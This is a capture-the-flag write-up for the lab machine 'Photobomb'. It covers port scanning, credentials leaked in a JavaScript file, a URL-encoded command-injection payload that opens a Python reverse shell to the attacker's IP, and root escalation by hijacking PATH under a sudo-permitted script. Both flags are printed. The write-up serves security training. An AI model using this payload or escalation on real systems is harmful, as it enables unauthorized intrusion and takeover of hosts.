-> Started by enumerating this machine
```
┌──(root㉿kali)-[/home/astra]
└─# nmap -p- --min-rate 10000 -Pn -sV 10.10.11.182   

Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-22 14:24 EST
Nmap scan report for photobomb.htb (10.10.11.182)
Host is up (0.049s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.78 seconds
```
-> Here I dont find much, so I go online, and I find an interesting js file /photobomb.js
![jsonline](https://user-images.githubusercontent.com/47869173/220764971-4011a7eb-3fc5-4896-a187-642df7113bd1.png)
```
function init() {
  // Jameson: pre-populate creds for tech support as they keep forgetting them and emailing me
  if (document.cookie.match(/^(.*;)?\s*isPhotoBombTechSupport\s*=\s*[^;]+(.*)?$/)) {
    document.getElementsByClassName('creds')[0].setAttribute('href','http://pH0t0:b0Mb!@photobomb.htb/printer');
  }
}
window.onload = init;
```

-> Its a login pH0t0:b0Mb!, so I try to login, and got access, but there is nothing to see, so I try and intercept the download button with burp, and modify the filetype parameter to get a reverse shell

%3bexport+RHOST%3d"10.10.14.135"%3bexport+RPORT%3d7777%3bpython3+-c+'import+sys,socket,os,pty%3bs%3dsocket.socket()%3bs.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))))%3b[os.dup2(s.fileno(),fd)+for+fd+in+(0,1,2)]%3bpty.spawn("sh")'
![reverseshellburp](https://user-images.githubusercontent.com/47869173/220764975-826b4903-daaf-426c-89a6-d05c93f28c5e.png)
```
┌──(root㉿kali)-[/home/astra]
└─# nc -lvnp 7777

listening on [any] 7777 ...
connect to [10.10.14.135] from (UNKNOWN) [10.10.11.182] 42570
$ 
```
-> Anddd we got access, now I find the first flag user.txt
```
$ cd
cd
$ cat user.txt                                                                                                                                                                                                                              
cat user.txt                                                                                                                                                                                                                                
49d347a1b7a3c694f35dea84b1aec200                                                                                                                                                                                                            
$  
```
-> Now we have to escalate privileges, we already have linpeas.sh installed on the system.
```
Linpeas -> Linpeas is a popular tool used to search for possible paths to escalate privileges on Linux, Unix, and MacOS hosts.

Matching Defaults entries for wizard on photobomb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User wizard may run the following commands on photobomb:
    (root) SETENV: NOPASSWD: /opt/cleanup.sh
```
-> Found out that I can run "cleanup.sh" without permission, and a file named "find" with "bash-p"
```
wizard@photobomb:~$ cat find
cat find
bash -p
wizard@photobomb:~$ chmod +x find
chmod +x find
wizard@photobomb:~$ ./find
./find
wizard@photobomb:~$ sudo PATH=$PWD:$PATH /opt/cleanup.sh
sudo PATH=$PWD:$PATH /opt/cleanup.sh
root@photobomb:/home/wizard/photobomb# 
```
-> We got root access, now just look for the flag
```

root@photobomb:/home/wizard/photobomb# cd
cd
root@photobomb:~# cat root.txt  
cat root.txt
01e8faa319f55858b805b53e0fcd3eb4
root@photobomb:~# 
```

